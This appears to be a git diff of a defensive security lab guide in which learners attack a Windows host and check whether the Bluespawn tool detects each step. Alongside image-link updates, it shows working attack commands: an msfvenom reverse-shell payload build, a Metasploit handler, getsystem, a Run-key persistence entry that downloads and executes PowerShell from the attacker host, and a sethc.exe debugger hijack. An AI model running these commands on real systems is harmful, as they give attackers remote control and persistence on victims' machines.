@@ -265,14 +265,13 @@ Become root:
 sudo su -
 ```
 
-
 Before we run the next commands, we need to get the **IP** of our **Linux System**. Lets do so by running the following:
 
 ```bash
 ifconfig
 ```
 
-<img width="716" height="175" alt="Get_IPLinux" src="https://github.com/user-attachments/assets/55ffa0a2-0502-4331-ad4e-720b1c1f4205" />
+<img width="822" height="172" alt="image" src="https://github.com/user-attachments/assets/2b1c4aaf-cc64-4ecb-9763-84aada0c6a1c" />
 
 **REMEMBER: YOUR IP WILL BE DIFFERENT**
 
@@ -283,14 +282,13 @@ cd /tmp/
 ```
 
 
-
 Run the following commands to start a simple backdoor and backdoor listener: 
 
 ```bash
 msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe > /tmp/TrustMe.exe
 ```
 
-<img width="1096" height="136" alt="2026-03-26_10-33" src="https://github.com/user-attachments/assets/cedde4be-e44e-4bab-87bb-5a683603e50f" />
+<img width="934" height="119" alt="image" src="https://github.com/user-attachments/assets/fd99899d-5962-4fcf-973e-18ab23db5ae2" />
 
 Now let's start the **Metasploit** Handler
 
@@ -320,7 +318,7 @@ exploit
 
 It should look like this:
 
-<img width="687" height="206" alt="2026-02-23_15-38" src="https://github.com/user-attachments/assets/71226123-2163-4237-8173-c7586de81ee7" />
+<img width="738" height="237" alt="image" src="https://github.com/user-attachments/assets/c0f71b47-4b0b-4b37-b016-0851c5932845" />
 
 Open up a **Powershell** terminal, copy the file over from **Linux**
 
@@ -351,7 +349,7 @@ TrustMe.exe
 
 Back at your Ubuntu terminal, you should have a metasploit session!
 
-<img width="987" height="392" alt="2026-03-26_10-44" src="https://github.com/user-attachments/assets/152dd3e7-11d7-43d8-85f6-45d0870cc725" />
+<img width="940" height="466" alt="image" src="https://github.com/user-attachments/assets/8458c8b8-63fc-4749-9d74-730f205cd773" />
 
 Now, let’s look at keystroke logging.
 
@@ -390,11 +388,11 @@ Here are just some of the groups that use this technique:
 
 meterpreter > `shell`
 
-C:\> `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Payload /d "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://172.20.243.5:80/a'))\"" /f`
+C:\Users\Administrator\Desktop> `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Payload /d "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://[Your Linux IP Address]:80/a'))\"" /f`
 
-C:\>  `reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe"`
+C:\Users\Administrator\Desktop> `reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe"`
 
-![](attachments/Clipboard_2020-06-15-14-00-53.png)
+<img width="1514" height="880" alt="image" src="https://github.com/user-attachments/assets/bc7ffe81-a9c5-42d5-b565-e9a640eb5301" />
 
 Go and check Bluespawn.  Did it detect it?
 
@@ -411,10 +409,9 @@ Here are just some of the groups that use this technique:
 
 meterpreter >`getsystem`
 
-![](attachments/Clipboard_2020-06-15-13-52-28.png)
+<img width="685" height="82" alt="image" src="https://github.com/user-attachments/assets/fffb4bd8-3cd5-4b9d-b4aa-bde75e26dca2" />
 
-
-![](attachments/Clipboard_2020-06-15-13-56-34.png)
+<img width="1500" height="560" alt="image" src="https://github.com/user-attachments/assets/eb3352e1-2793-4ac3-9bc4-9a0f747c4a0f" />
 
 Go and check Bluespawn.  Did it detect it?
 
